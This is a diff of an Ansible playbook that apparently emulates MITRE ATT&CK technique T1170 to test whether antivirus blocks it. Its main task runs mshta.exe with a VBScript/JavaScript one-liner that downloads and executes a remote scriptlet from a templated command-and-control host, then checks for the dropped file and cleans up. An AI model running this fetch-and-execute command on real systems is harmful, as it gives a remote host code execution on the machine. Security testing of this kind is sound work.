@@ -5,19 +5,31 @@
    - /opt/ansible/vars.yaml
   tasks:
     - name: Run mshta.exe to download and execute script (create a new file evil.sct)
+      tags: always
       win_shell: |
 # mshta.exe javascript:a=GetObject("script:http://{{ cnc_fqdn }}:{{ cnc_port}}/{{ cnc_sct }}").Exec();close();
         mshta vbscript:Close(Execute("GetObject(""{{ cnc_fqdn }}:{{ cnc_port}}/{{ cnc_sct }}"")"))
+    - name: sleep for 10 seconds and continue with play to check if AV removed or Not
+      tags: always
+      wait_for: timeout=10
+      delegate_to: localhost
     - name: check file exist
       tags: always
       win_stat:
         path: evil.sct
-      register: T1117
+      register: T1170
     - name: check if playbook was blocked
       tags: always
-      debug: msg="Playbook Completed:T1117:blocked:win:"
-      when: T1117.stat.exists == False        
+      debug: msg="Playbook Completed#T1170#blocked#win#"
+      when: T1170.stat.exists == False        
     - name: check if playbook was successfull
       tags: always
-      debug: msg="Playbook Completed:T1117:passed:win:"
-      when: T1117.stat.exists  
+      debug: msg="Playbook Completed#T1170#passed#win#"
+      when: T1170.stat.exists  
+
+    - name: cleanup      
+      tags: alawys
+      win_file:
+        path: evil.sct
+        state: absent
+      when: T1170.stat.exists 
